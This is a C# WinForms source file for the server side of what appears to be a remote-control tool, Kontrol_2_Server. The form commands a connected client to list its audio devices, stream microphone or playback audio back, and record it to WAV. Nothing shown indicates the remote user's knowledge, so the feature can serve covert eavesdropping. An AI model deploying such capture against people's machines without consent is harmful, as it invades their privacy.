using System;
using System.IO;
using System.Windows.Forms;
using NAudio.Wave;
using Kontrol_2_Server.ThirdParty;

namespace Kontrol_2_Server
{
	public partial class RemoteAudioForm : Form
	{
		public int clientId = 0;
		private string recPath = null;
		private AudioStream stream = new AudioStream();
		private MemoryStream recStream = new MemoryStream();
		private WaveFormat waveFormat = new WaveFormat();
		public RemoteAudioForm()
		{
			InitializeComponent();
		}

		private void RemoteAudioForm_Load(object sender, EventArgs e)
		{
			MainForm.SendCommand("remote_audio\naudio_devices", clientId);
		}

		private void RemoteAudioForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			MainForm.raf = new RemoteAudioForm();
			if (startButton.Text == "Stop")
				MainForm.SendCommand("remote_audio\nend_stream", clientId);
		}

		public void Init(char type, int sampleRate = 48000, int channels = 2)
		{
			if (type == 'r') waveFormat = WaveFormat.CreateIeeeFloatWaveFormat(sampleRate, channels);
			else waveFormat = new WaveFormat();
			stream.Init(waveFormat);

            Console.WriteLine($"Current Audio Wave Format:\n\tSample Rate: {waveFormat.SampleRate}\n\tChannels: {waveFormat.Channels}");
		}
		
		public void ProcessAudio(byte[] audioBytes)
		{
			try
			{
				MemoryStream ms = new MemoryStream(audioBytes);
				stream.BufferPlay(audioBytes);
				waveViewer.WaveStream = new RawSourceWaveStream(ms, waveFormat);
				waveViewer.FitToScreen();
				if (recPath != null) recStream.Write(audioBytes, 0, audioBytes.Length); 
			}
			catch { }
		}

		public void ListDevices(string devices)
		{
			string[] xsplit = devices.Split('&');
			if (this.InvokeRequired)
			{
				devicesCombo.Invoke(new MethodInvoker(delegate
				{
					devicesCombo.Items.Clear();
					foreach (string device in xsplit) 
						if (!string.IsNullOrEmpty(device)) devicesCombo.Items.Add(device);
					devicesCombo.SelectedIndex = 0;
					devicesCombo.Enabled = true;
					startButton.Enabled = true;
				}));
			}
			else
			{
				devicesCombo.Items.Clear();
				foreach (string device in xsplit) 
					if (!string.IsNullOrEmpty(device)) devicesCombo.Items.Add(device);
				devicesCombo.SelectedIndex = 0;
				devicesCombo.Enabled = true;
				startButton.Enabled = true;
			}
		}

		private void startButton_Click(object sender, EventArgs e)
		{
			if (startButton.Text.ToLower() == "start")
			{
				if (devicesCombo.GetItemText(devicesCombo.SelectedItem).StartsWith("R: "))
					MainForm.SendCommand("remote_audio\nbegin_stream\n" + devicesCombo.GetItemText(devicesCombo.SelectedItem).Substring(devicesCombo.GetItemText(devicesCombo.SelectedItem).IndexOf("ID: ") + 4) + "\nrenderer", clientId);
				else
					MainForm.SendCommand("remote_audio\nbegin_stream\n" + devicesCombo.SelectedIndex + "\ncapturer", clientId);
				devicesCombo.Enabled = false;
				recButton.Enabled = true;
				startButton.Text = "Stop";
				//auStream = true;
				//WaveRenderer.Start();
			}
			else
			{
				devicesCombo.Enabled = true;
				recButton.Enabled = false;
				startButton.Text = "Start";
				if (recButton.Text == "Stop recording") recButton_Click(null, null);
				MainForm.SendCommand("remote_audio\nend_stream", clientId);
				//auStream = false;
				//WaveRenderer.Stop();
			}
		}
		
		private void recButton_Click(object sender, EventArgs e)
		{
			if (recButton.Text == "Record")
			{
				SaveFileDialog fd = new SaveFileDialog();
				fd.AddExtension = true;
				fd.DefaultExt = ".wav";
				fd.Filter = "Waveform Audio File | *.wav";
				fd.Title = "Waveform Audio File location.";
				if (fd.ShowDialog() == DialogResult.OK)
				{
					if (string.IsNullOrEmpty(fd.FileName) || string.IsNullOrWhiteSpace(fd.FileName)) return;
					recPath = fd.FileName;
				}
				recButton.Text = "Stop recording";
			}
			else
			{
				recStream.Position = 0;
				var waveStream = new RawSourceWaveStream(recStream, waveFormat); 
				WaveFileWriter.CreateWaveFile(recPath, waveStream);
				recStream.Dispose();
				recStream.Close();
				recStream = new MemoryStream();
				recPath = null;
				recButton.Text = "Record";
			}
		}

		private void WaveRenderer_Tick(object sender, EventArgs e)
		{

		}
	}
}
